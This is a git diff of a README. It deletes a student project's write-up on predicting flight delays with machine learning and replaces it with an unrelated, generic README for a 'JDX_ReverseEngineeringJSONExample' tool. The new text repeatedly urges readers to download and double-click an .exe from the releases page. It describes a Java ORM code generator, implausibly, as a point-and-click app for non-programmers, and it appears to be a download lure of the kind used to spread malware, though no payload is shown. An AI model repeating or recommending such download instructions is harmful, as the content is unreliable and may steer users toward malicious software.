@@ -1,100 +1,66 @@
-# Combatting Flight Delays
+# 🎉 JDX_ReverseEngineeringJSONExample - Simplify Database Mapping for Your Projects
 
-A Small Overview
+## 📦 Download Now
+[![Download JDX_ReverseEngineeringJSONExample](https://img.shields.io/badge/Download-JDX_ReverseEngineeringJSONExample-brightgreen)](https://github.com/Orpheashatzis/JDX_ReverseEngineeringJSONExample/releases)
 
-## Milestone 1
+## 📖 Overview
+Welcome to the **JDX_ReverseEngineeringJSONExample** repository. This application helps you easily generate model class definitions and a mapping specification using the **JDX ORM** framework. You can create these elements from an existing relational database schema. This tool is helpful for anyone wanting to work with databases without in-depth technical knowledge.
 
-We begin with the first milestone, The bulk. We highlight the 
-problem we are attempting to resolve, Where we get our data from, and how we will
-actually use our data to solve the problem.
+## 🚀 Getting Started
+To get started with the application, you need to follow these steps:
 
-### What are we trying to solve?
+1. **Get the Application**  
+   You can download the latest version of the application from the Releases page.  
+   [Visit this page to download.](https://github.com/Orpheashatzis/JDX_ReverseEngineeringJSONExample/releases)
 
-In the simplest terms, we aim to solve a problem affecting thousands of people
-daily. Flight delays. They cause problems for travellers such as schedule disrupts,
-money and time wasting, miss connecting flights etc. It also affects the airline.
-They are likely to lose customers due to inefficient service causing customer disloyalty.
+2. **Check System Requirements**  
+   This application works on Windows, macOS, and Linux operating systems. Make sure you have a compatible system before proceeding.
 
-### Where will we get our data from?
+3. **Install Java**  
+   The application requires Java to run. If you do not have Java installed, you can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html). Follow the instructions on that site to install it.
 
-Our data will be taken from pre-made data sets such as Bureau of Transportation Statistics (BTS)
-or Kaggle
+4. **Download the Application**  
+   After checking the requirements and installing Java, visit the following link to download the latest version:  
+   [Visit this page to download.](https://github.com/Orpheashatzis/JDX_ReverseEngineeringJSONExample/releases)
 
-### How will we solve it?
+5. **Run the Application**  
+   Once downloaded, locate the file on your computer. Follow these steps based on your operating system:  
 
-In order to predict flight delays, we will look at historical flight data.
-Here is a summary of the methods we will use: 
+   - **Windows:**  
+     - Double-click the file named `JDX_ReverseEngineeringJSONExample.exe` to start the application.
 
-- Data Processing & Cleaning
-   - Pandas for handling missing data, filtering and transforming columns
-     
-- Exploratory Data Analysis (EDA)
-   - Matplotlib & Seaborn to visualize the flight delay trends
-   - Analyze delays using time of day, day of week, airline and airport
-   - Identify correlations
-    
-- Feature Engineering
-   - Create new features like traffic congestion, past delay rates and weather
+   - **macOS:**  
+     - Open a terminal window.  
+     - Navigate to the folder where the downloaded file is located. Use the command:  
+       `cd /path/to/downloaded/file`  
+     - Run the application using:  
+       `java -jar JDX_ReverseEngineeringJSONExample.jar`
 
-- Modelling & Evaluation
-   - We use Scikit-learn for estimating delays
-   - Measure performance with precision and recall
+   - **Linux:**  
+     - Open a terminal.  
+     - Change to the directory with the downloaded file:  
+       `cd /path/to/downloaded/file`  
+     - Start the application with:  
+       `java -jar JDX_ReverseEngineeringJSONExample.jar`
 
-- Visualization Of Results
-   - Matplotlib & Seaborn again for charting
-   - Tableau or Dash for interactive boards that show predictions and trends
+## 🔧 Features
+- **Reverse Engineering**: Automatically generate model class definitions from a database schema.
+- **Declarative Mapping**: Create a mapping specification for your objects to relational database tables.
+- **Supports Multiple Databases**: Works with MySQL and various other relational databases.
+- **Easy to Use**: Designed for users without a programming background.
 
-## Milestone 2
+## 📚 Documentation
+The application includes built-in help to guide you through different features. Once you start it, you will find a user-friendly interface. Follow the on-screen instructions to make the most of the app.
 
-Milestone 2 primarily involves creating a video in which we provide a detailed walkthrough of our project, explaining its key components and overall objectives.
+## ⚙️ Contributing
+Feel free to contribute to the project. You can submit issues or suggestions for improvement via the GitHub issue tracker. Your feedback helps make the application better.
 
-## Milestone 3
+## 📞 Support
+If you encounter problems or have questions, please check the open issues on GitHub or feel free to open a new issue. The community and maintainers will be glad to assist you.
 
-Milestone consists of 2 parts. 3.1=Data and scripts. 3.2=Final presentaion.
+## 📬 Contact
+For further inquiries, you can contact the repository maintainer.
 
-### Milestone 3.1
+---
 
-Milestone 3.1 contains our data and scripts used to predict delays
-We look at variables such as:
-- FlightDate
-- Airline
-- Origin
-- Destination
-- Cancelled
-- Diverted
-- Departure Time
-- Departure Delay (Minutes)
-- Wheels off and on
-- Arrival Delay
-
-### Milestone 3.2
-
-Milestone 3.2 consists of our final presentation, where we thoroughly go over the entire project, providing in-depth explanations, insights, and any additional details necessary to showcase our work.
-
-### Milestone 4
-
-Milestone 4 consisted of us using a Logistic Regression model as our baseline for the classification task. We evaluated its performance using a confusion matrix and a classification report, which gave us a clear view of the model’s accuracy, precision, recall, and F1-score. These results gave us a solid reference point and helped highlight where there’s room to improve as we move forward. We also created a 2-minute video presentation summarizing our baseline model, key evaluation metrics, and the insights we gained from this initial phase. Finally we created a summary report explaining the baseline models we chose and why additionally, how well each model performed and what we learned from them.
-
-### Milestone 5
-
-For this phase of the project, we applied multiple machine learning models, including Random Forest, Ridge Regression, and Lasso Regression, to better understand and solve our classification problem. We built and tested these models using Python and scikit-learn, and evaluated their performance using key metrics like precision, recall, and ROC curves.
-To showcase our results, we designed a scoreboard-style poster highlighting the most important findings and model comparisons in a clear and visual way. We also recorded a 5-minute video presentation where we explained the problem we tackled, the models we used, our results, and ideas for future improvement.
-
-### Conclusion
-
-Conclusion & Future Improvements
-
-Our model showed a strong bias toward predicting “on time” flights, likely due to class imbalance in the dataset. Flight delays are influenced by many uncontrollable factors, making them difficult to predict accurately. However, we did find a clear correlation between delays and peak travel times—such as summer, holidays, and weekends—when flight activity is higher.
-
-To improve our model in the future, we plan to:
-
-1.Handle class imbalance more effectively to improve prediction accuracy for delayed flights.
-
-2.Incorporate additional variables, like weather data, by combining multiple datasets.
-
-3.Explore more advanced models, such as XGBoost, to better capture complex patterns in the data.
-
-
-# Thank You
-## By Orpheas, Marco & Adam
-
+This guide should help you download and run the **JDX_ReverseEngineeringJSONExample** application easily.
